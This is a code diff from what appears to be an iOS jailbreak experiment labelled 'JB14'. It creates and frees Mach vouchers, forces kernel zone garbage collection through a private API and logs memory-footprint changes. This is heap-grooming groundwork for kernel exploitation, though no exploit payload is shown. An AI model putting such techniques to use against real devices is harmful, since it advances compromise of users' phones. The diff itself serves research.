-                    for (int i = 0; i < voucherCount; i++) {
-                        if (vouchers[i] != MACH_PORT_NULL)
-                            mach_port_deallocate(mach_task_self(), vouchers[i]);
+                if (!isr_stopped()) {
+                    log(@"[JB14] --- Paso 4: Deallocate vouchers + GC ---");
+                    if (vouchers) {
+                        for (int i = 0; i < voucherCount; i++) {
+                            if (vouchers[i] != MACH_PORT_NULL)
+                                mach_port_deallocate(mach_task_self(), vouchers[i]);
+                        }
                     }
-                    free(vouchers);
-                }
 
-                if (!isr_stopped() && totalZones > 0) {
-                    log(@"[JB14] --- Paso 4: mach_zone_force_gc ---");
                     typedef kern_return_t (*ZoneForceGCFn)(host_t);
                     ZoneForceGCFn forceGC = (ZoneForceGCFn)dlsym(RTLD_DEFAULT, "mach_zone_force_gc");
                     if (forceGC) {
                         kr = forceGC(mach_host_self());
                         log([NSString stringWithFormat:@"[JB14] mach_zone_force_gc kr=%d", kr]);
-
-                        jb14_zone_name_t *names3 = NULL;
-                        mach_msg_type_number_t namesCnt3 = 0;
-                        jb14_zone_info_t *info3 = NULL;
-                        mach_msg_type_number_t infoCnt3 = 0;
-                        kr = zoneInfoFn(mach_host_self(), &names3, &namesCnt3, &info3, &infoCnt3);
-                        if (kr == KERN_SUCCESS && preSizes) {
-                            int shrunk = 0;
-                            for (uint32_t i = 0; i < namesCnt3 && i < namesCnt1 && i < (uint32_t)infoCnt3; i++) {
-                                int64_t delta = (int64_t)info3[i].zi_cur_size - (int64_t)preSizes[i];
-                                if (delta < 0) {
-                                    shrunk++;
-                                    if (shrunk <= 10 && !isr_stopped()) {
-                                        log([NSString stringWithFormat:@"[JB14] GC_SHRINK[%u] '%s' %lld bytes",
-                                             i, names3[i].zn_name, (long long)delta]);
-                                    }
-                                }
-                            }
-                            log([NSString stringWithFormat:@"[JB14] Post-GC: %d zones shrank", shrunk]);
-                        }
-                        if (names3) vm_deallocate(mach_task_self(), (vm_address_t)names3, namesCnt3 * sizeof(jb14_zone_name_t));
-                        if (info3) vm_deallocate(mach_task_self(), (vm_address_t)info3, infoCnt3 * sizeof(jb14_zone_info_t));
                     } else {
                         log(@"[JB14] mach_zone_force_gc not available");
                     }
-                }
+                    usleep(50000);
 
-                if (preSizes) free(preSizes);
-                if (names1) vm_deallocate(mach_task_self(), (vm_address_t)names1, namesCnt1 * sizeof(jb14_zone_name_t));
-                if (info1) vm_deallocate(mach_task_self(), (vm_address_t)info1, infoCnt1 * sizeof(jb14_zone_info_t));
+                    jb14_vm_info_t vmPost3;
+                    memset(&vmPost3, 0, sizeof(vmPost3));
+                    vmCnt = sizeof(jb14_vm_info_t) / sizeof(natural_t);
+                    task_info(mach_task_self(), 22, (task_info_t)&vmPost3, &vmCnt);
+                    gcDeltaBytes = (int64_t)vmPost3.phys_footprint - (int64_t)vmPre.phys_footprint;
+                    log([NSString stringWithFormat:@"[JB14] Post-GC: phys=%llu deltaFromBase=%+lld recovered=%+lld",
+                         (unsigned long long)vmPost3.phys_footprint, (long long)gcDeltaBytes,
+                         (long long)(voucherDeltaBytes + surfaceDeltaBytes - gcDeltaBytes)]);
+                } else if (vouchers) {
+                    for (int i = 0; i < voucherCount; i++) {
+                        if (vouchers[i] != MACH_PORT_NULL)
+                            mach_port_deallocate(mach_task_self(), vouchers[i]);
+                    }
+                }
+                if (vouchers) free(vouchers);
             }
         }
 
         log(@"[JB14] ========================================");
-        log([NSString stringWithFormat:@"[JB14] RESULTADO: totalZones=%d interesting=%d vouchers=%d zoneDelta=%d",
-             totalZones, interestingZones, voucherCount, zoneDelta]);
+        log([NSString stringWithFormat:@"[JB14] RESULTADO: vouchers=%d surfaces=%d voucherDelta=%+lld surfaceDelta=%+lld gcDelta=%+lld ports=%d",
+             voucherCount, surfaceCount, (long long)voucherDeltaBytes, (long long)surfaceDeltaBytes,
+             (long long)gcDeltaBytes, portDelta]);
         log(@"[JB14] ========================================");
 
         done(@{
-            @"totalZones": @(totalZones),
-            @"interestingZones": @(interestingZones),
             @"vouchersCreated": @(voucherCount),
-            @"zonesGrew": @(zoneDelta)
+            @"surfacesCreated": @(surfaceCount),
+            @"voucherDeltaBytes": @(voucherDeltaBytes),
+            @"surfaceDeltaBytes": @(surfaceDeltaBytes),
+            @"gcDeltaBytes": @(gcDeltaBytes),
+            @"portDelta": @(portDelta)
         });
     });
 }
